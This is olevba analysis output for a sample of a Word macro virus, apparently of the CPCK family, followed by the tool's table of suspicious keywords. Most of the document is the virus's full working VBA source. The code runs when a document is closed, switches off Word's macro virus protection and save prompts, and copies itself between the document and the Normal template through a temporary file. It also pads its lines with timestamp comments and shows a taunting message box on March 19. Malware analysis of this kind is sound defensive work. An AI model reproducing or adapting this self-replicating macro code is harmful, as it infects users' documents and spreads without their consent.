olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-385da7c493c755345e5d3ea9532c62182b3f9008
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-385da7c493c755345e5d3ea9532c62182b3f9008 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'vir.doc31.03.04 10:33:16
On Error Resume Next
'vir.doc31.03.04 10:33:16
Options.SaveNormalPrompt = 0
'vir.doc31.03.04 10:33:16
DS73 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'vir.doc31.03.04 10:33:16
Application.EnableCancelKey = 0
'vir.doc31.03.04 10:33:16
Options.ConfirmConversions = 0
'vir.doc31.03.04 10:33:16
JV38 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'vir.doc31.03.04 10:33:16
Options.VirusProtection = 0
'vir.doc31.03.04 10:33:16
If DS73 > 0 And JV38 > 0 Then GoTo EH88
'vir.doc31.03.04 10:33:16
If DS73 = 0 Then
'vir.doc31.03.04 10:33:16
Set GL62 = ActiveDocument.VBProject.VBComponents.Item(1)
'vir.doc31.03.04 10:33:16
BP23 = True
'vir.doc31.03.04 10:33:16
End If
'vir.doc31.03.04 10:33:16
If JV38 = 0 Then
'vir.doc31.03.04 10:33:16
Set GL62 = NormalTemplate.VBProject.VBComponents.Item(1)
'vir.doc31.03.04 10:33:16
MD20 = True
'vir.doc31.03.04 10:33:16
End If
'vir.doc31.03.04 10:33:16
If MD20 = True Then
'vir.doc31.03.04 10:33:16
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\boot.sys"
'vir.doc31.03.04 10:33:16
GL62.CodeModule.AddFromFile ("c:\boot.sys")
'vir.doc31.03.04 10:33:16
GL62.CodeModule.deletelines 1, 4
'vir.doc31.03.04 10:33:16
GL62.CodeModule.replaceline 1, "Sub Document_Close()"
'vir.doc31.03.04 10:33:16
ElseIf BP23 = True Then
'vir.doc31.03.04 10:33:16
GL62.CodeModule.AddFromFile ("c:\boot.sys")
'vir.doc31.03.04 10:33:16
GL62.CodeModule.deletelines 1, 4
'vir.doc31.03.04 10:33:16
End If
'vir.doc31.03.04 10:33:16
With GL62.CodeModule
'vir.doc31.03.04 10:33:16
For x = 2 To (GL62.CodeModule.CountOfLines - 1) Step 2
'vir.doc31.03.04 10:33:16
.replaceline x, "'" & Application.ActiveDocument & Now
'vir.doc31.03.04 10:33:16
Next x
'vir.doc31.03.04 10:33:16
End With
'vir.doc31.03.04 10:33:16
If Month(Now) = 3 And Day(Now) = 19 Then
'vir.doc31.03.04 10:33:16
For x = 1 To 5
'vir.doc31.03.04 10:33:16
MsgBox "Birgit or Manuela?", vbInformation, "Manuela!"
'vir.doc31.03.04 10:33:16
Next x
'vir.doc31.03.04 10:33:16
End If
'vir.doc31.03.04 10:33:16
EH88:
'vir.doc31.03.04 10:33:16
If JV38 <> 0 And DS73 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'vir.doc31.03.04 10:33:16
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

